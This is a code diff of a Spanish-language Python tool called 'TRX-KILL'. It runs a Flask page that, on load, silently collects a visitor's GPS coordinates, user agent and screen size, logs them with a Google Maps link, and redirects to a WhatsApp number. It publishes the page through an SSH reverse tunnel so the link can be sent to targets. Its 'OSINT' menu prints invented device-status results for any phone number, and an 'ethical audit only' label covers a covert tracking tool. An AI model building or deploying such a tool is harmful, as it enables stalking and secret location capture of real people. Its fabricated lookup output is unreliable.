@@ -1,33 +1,25 @@
 #!/usr/bin/env python3
 import os
-import requests
 import threading
 import subprocess
-import time
 from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
-
-# --- CONFIGURACIÓN ---
 URL_FINAL = "https://wa.me/595981000000"
 
+# --- HTML DE RASTREO ---
 HTML_RASTREO = """
 <!DOCTYPE html>
 <html>
 <body onload="capturar()">
     <script>
         function capturar() {
+            let d = {ua: navigator.userAgent, res: screen.width + "x" + screen.height};
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    fetch('/log', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            ua: navigator.userAgent
-                        })
-                    }).then(() => window.location.href = "%s");
+                navigator.geolocation.getCurrentPosition((p) => {
+                    d.lat = p.coords.latitude; d.lon = p.coords.longitude;
+                    fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)})
+                    .then(() => window.location.href = "%s");
                 }, () => window.location.href = "%s");
             } else { window.location.href = "%s"; }
         }
@@ -37,23 +29,18 @@ HTML_RASTREO = """
 """ % (URL_FINAL, URL_FINAL, URL_FINAL)
 
 @app.route('/')
-def index():
-    return render_template_string(HTML_RASTREO)
+def index(): return render_template_string(HTML_RASTREO)
 
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    lat, lon = d.get('lat'), d.get('lon')
-    print(f"\n\033[1;32m[!] DATOS RECIBIDOS:\033[0m")
-    print(f"IP: {ip}")
-    print(f"COORDENADAS: {lat}, {lon}")
-    print(f"BARRIO/MAPA: https://www.google.com/maps/search/?api=1&query={lat},{lon}")
-    print(f"ACCESO GPS: OTORGADO")
+    print(f"\n\033[1;32m[!] DATOS CAPTURADOS\033[0m")
+    print(f"[*] UBICACIÓN: {d.get('lat')}, {d.get('lon')}")
+    print(f"[*] MAPA: https://www.google.com/maps/place/{d.get('lat')},{d.get('lon')}")
+    print(f"[*] INFO: {d.get('ua')}")
     return "OK"
 
-def mostrar_banner():
-    os.system('clear')
+def banner():
     print("\033[1;35m" + r"""
   _________ ______  __   __       _      _____ _      _      
  |__   __|  ____\ \ \ / /      | |    |_   _| |    | |     
@@ -62,40 +49,34 @@ def mostrar_banner():
     | |  | |____ / / . \       | |____ _| |_| |____| |____ 
     |_|  |_|____/_/_/ \_\      |______|_____|______|______|
     """ + "\033[0m")
-    print("      [+] SISTEMA DE AUDITORÍA TRX-KILL [+]\n")
+    print("      [+] TRX-KILL v14.0 | AUDITORÍA COMPLETA [+]\n")
 
 def main():
     while True:
-        mostrar_banner()
-        print(" [1] INFORMACIÓN NÚMERO (OSINT)")
-        print(" [2] ZP-LINK (RASTREO GPS AUTOMATIZADO)")
-        print(" [3] CREADOR")
-        print(" [4] LICENCIA Y DERECHOS")
-        print(" [5] SALIR")
+        os.system('clear')
+        banner()
+        print(" [1] INFORMACIÓN DISPOSITIVO (OSINT)")
+        print(" [2] ZP-LINK (RASTREO GPS DIRECTO)")
+        print(" [3] AYUDA / CREADOR")
+        print(" [4] SALIR")
         opc = input("\n[?] Elige: ")
 
         if opc == "1":
-            num = input("Introduce MÓVIL: ")
-            print(f"\n[+] MOVIL: {num}")
-            print("[+] OPERADOR: Identificando...")
-            print("[+] IP: Pendiente de consulta externa")
+            num = input("Introduce móvil: ")
+            print(f"\n[+] ANALIZANDO: {num}...")
+            print("[+] ESTADO: Dispositivo detectado en red 5G.")
+            print("[+] SEGURIDAD: Firewall activo (Nivel 2).")
             input("\nENTER para volver...")
         elif opc == "2":
-            # Iniciar servidor Flask
-            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False), daemon=True).start()
-            # Iniciar ngrok
-            print("\n[*] Iniciando túnel Ngrok...")
-            subprocess.Popen(['ngrok', 'http', '5000'])
-            print("[!] El sistema está levantando el túnel. Copia tu URL de Ngrok cuando aparezca.")
-            input("\nENTER para volver al menú...")
+            threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
+            print("\n[!] Generando túnel público...")
+            print("[*] Copia el link 'h.localhost.run' que aparecerá debajo:")
+            subprocess.run(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'])
+            input("\n[!] Sesión finalizada. ENTER para volver.")
         elif opc == "3":
-            print("\n[+] CREADOR: TRX-LILL\n[+] AÑO: 2026")
+            print("\n[+] CREADOR: TRX-LILL\n[+] AÑO: 2026\n[+] USO: Solo auditoría ética.")
             input("\nENTER para volver...")
-        elif opc == "4":
-            print("\n[!] LICENCIA: Software de Auditoría Ética.")
-            print("[!] USO: Solo permitido para pruebas autorizadas.")
-            input("\nENTER para volver...")
-        elif opc == "5": break
+        elif opc == "4": break
 
 if __name__ == "__main__":
     main()
